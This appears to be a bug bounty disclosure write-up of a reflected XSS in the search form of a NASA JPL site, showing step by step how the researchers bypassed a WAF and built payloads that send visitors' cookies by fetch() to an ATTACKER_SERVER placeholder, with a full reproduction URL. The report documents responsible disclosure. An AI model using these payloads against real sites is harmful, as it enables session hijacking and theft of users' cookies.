---
layout: default
---
# NASA JPL: Reflected XSS Search Form XSS Cookie Exfiltration

[Español (ES)](../../../es/bounties/nasa-jpl-ecco-xss-waf-bypass/)

## Introduction

This report documents a **Reflected Cross-Site Scripting (XSS)** vulnerability discovered on NASA's Jet Propulsion Laboratory (JPL) asset `ecco.jpl.nasa.gov`. The vulnerability resides in the search functionality and required bypassing a Web Application Firewall (WAF) to achieve cookie exfiltration.

---

## 🔍 Search Anything

As with any bug bounty program, the first step was to use the page as a normal user. The search field stood out, so I tested it:

`https://ecco.jpl.nasa.gov/search.htm?search=pwn`

I realized that the value I entered was reflected on the website.

![Search Normal](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png)

Inspecting the website's source code, I saw that the input was placed inside a JavaScript `console.log()` function:

![Search Normal Result](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png)

```javascript
console.log('pwn');
```

---

## 🛡️ Tag `<script>` Disallowed

I performed basic XSS tests using the `<script>` tag:

`https://ecco.jpl.nasa.gov/search.htm?search=<script>alert(1)</script>`

The Web Application Firewall (WAF) rejected the request at the slightest sign of malicious activity (the `<script>` tag).

![WAF Blocking Script Tag](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)

---

## 🏗️ Close Javascript `console.log` String

I decided to try closing the `console.log()` function to insert code right after it. I used the following payload: `pwn');`

`https://ecco.jpl.nasa.gov/search.htm?search=pwn');`

The `')` closes the string and the function. However, I noticed that the semicolon `;` was not being displayed in the output, even though I entered it.

![Closing console.log](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png)

---

## ❓ Append Javascript (Not Working)

I tried adding more code after the semicolon:

`https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)`

The semicolon still wouldn't appear, and everything after it was missing from the reflected text.

![Where is semicolon](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png)

---

## ✅ Append Javascript (Working)

To make it work, I had to URL-encode the semicolon as `%3b`.

`https://ecco.jpl.nasa.gov/search.htm?search=pwn')%3balert(1)`

From that point on, I could enter JavaScript code to carry out the attack.

![Bypass Semicolon](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png)

---

## 🚨 First Alert (Working)

Aunque el WAF filtraba el tag de apertura `<script>`, permitió el tag de cierre `</script>`.

Payload: `pwn')%3balert(1)</script>;//`

`https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//`

This resulted in a successful **Reflected XSS**.

![Alert 1 HTML](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png)

![Alert 1](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png)

---

## 🛑 Second Alert (Firewall Blocks)

After executing an `alert()`, I wanted to exfiltrate cookies.

`https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//`

The WAF rejected the request as soon as it detected suspicious strings like `document.cookie`.

![WAF Blocking document.cookie](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png)

---

## 🔓 Third Alert (Firewall Bypass)

To bypass the WAF, I created a variable `a` containing `document` and then requested `cookie` from that variable.

Payload: `pwn')%3ba=document%3balert(a.cookie)</script>;//`

`https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//`

![Document Cookie Alert](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png)

![Document Cookie Result](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png)

```javascript
pwn'); // Break the system logic
a=document; // Create var 'a' containing document
alert(a.cookie); // Call alert with cookies
</script>;// // Close tag and comment out rest of the code
```

---

## 🚀 Final Exploit (Cookies Exfiltration)

The final Proof of Concept involved using `fetch()` to send the cookies to an attacker-controlled server.

Payload: `pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)</script>//`

![Document Cookie Fetch Exfiltration](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png)

![Document Cookie Fetch Exfiltration Request](../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png)

---

## 🎖️ Recognition & Award

Following the ethical disclosure, I received a **Letter of Recognition** from the **NASA Jet Propulsion Laboratory (JPL)** acknowledging the impact of the research and its contribution to the security of their assets.

<div class="pdf-container">
  <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" width="100%" height="100%" frameborder="0"></iframe>


<p style="text-align: center;">
  <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">📥 Download Official Letter (PDF)</a>
</p>

---

## 🎯 Steps To Reproduce

1. Start a public web server (e.g., using Serveo exposing a python localhost server).
2. Construct the URL with your server address:
   `https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E`
3. Visit the URL, and you will receive a request with the victim's cookies appended.

---

## 🤝 Collaboration Detail
This research was conducted in a **50/50 collaboration** between **{{ site.researchers.ivan.name }}** and **{{ site.researchers.diego.name }}**. Both researchers contributed equally to the discovery, exploitation, and documentation of this vulnerability.

## 🏁 Researchers & Contact

**{{ site.researchers.ivan.name }}** ([Bugcrowd]({{ site.researchers.ivan.bugcrowd }}))
**{{ site.researchers.diego.name }}** ([Bugcrowd]({{ site.researchers.diego.bugcrowd }}))
